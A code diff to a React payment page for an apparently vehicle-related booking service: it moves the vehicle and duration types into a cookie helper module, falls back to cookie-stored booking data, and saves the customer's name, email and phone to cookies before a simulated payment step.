@@ -7,6 +7,7 @@ import { Checkbox } from "@/components/ui/checkbox";
 import { Label } from "@/components/ui/label";
 import { ArrowLeft, Shield, CreditCard } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
+import { saveCustomerInfo, getVehicleData, getDurationData, Vehicle, Duration } from "@/lib/cookies";
 
 // Credit card brand logo SVG components
 const VisaLogo = ({ className }: { className?: string }) => (
@@ -117,20 +118,7 @@ const getCardName = (cardType: string): string => {
   return names[cardType as keyof typeof names] || names.unknown;
 };
 
-interface Vehicle {
-  registration: string;
-  make: string;
-  model: string;
-  color: string;
-}
-
-interface Duration {
-  days: number;
-  label: string;
-  originalPrice: number;
-  discountedPrice: number;
-  savings: number;
-}
+// Vehicle and Duration interfaces are now imported from cookies.ts
 
 interface FormData {
   fullName: string;
@@ -163,10 +151,17 @@ const PaymentPage = () => {
   const [errors, setErrors] = useState<Partial<FormData>>({});
 
   useEffect(() => {
+    // Try to get data from navigation state first, then cookies
     const { vehicle: vehicleData, duration: durationData } = location.state || {};
-    if (vehicleData && durationData) {
-      setVehicle(vehicleData);
-      setDuration(durationData);
+    const cookieVehicle = getVehicleData();
+    const cookieDuration = getDurationData();
+    
+    const finalVehicle = vehicleData || cookieVehicle;
+    const finalDuration = durationData || cookieDuration;
+    
+    if (finalVehicle && finalDuration) {
+      setVehicle(finalVehicle);
+      setDuration(finalDuration);
     } else {
       navigate('/');
     }
@@ -239,17 +234,21 @@ const PaymentPage = () => {
       });
     }
 
+    // Save customer info to cookies
+    const customerInfo = {
+      fullName: formData.fullName,
+      email: formData.email,
+      phone: formData.phone
+    };
+    saveCustomerInfo(customerInfo);
+
     // Simulate payment processing
     setTimeout(() => {
       navigate('/sms-confirmation', {
         state: {
           vehicle,
           duration,
-          customerInfo: {
-            fullName: formData.fullName,
-            email: formData.email,
-            phone: formData.phone
-          }
+          customerInfo
         }
       });
     }, 2000);
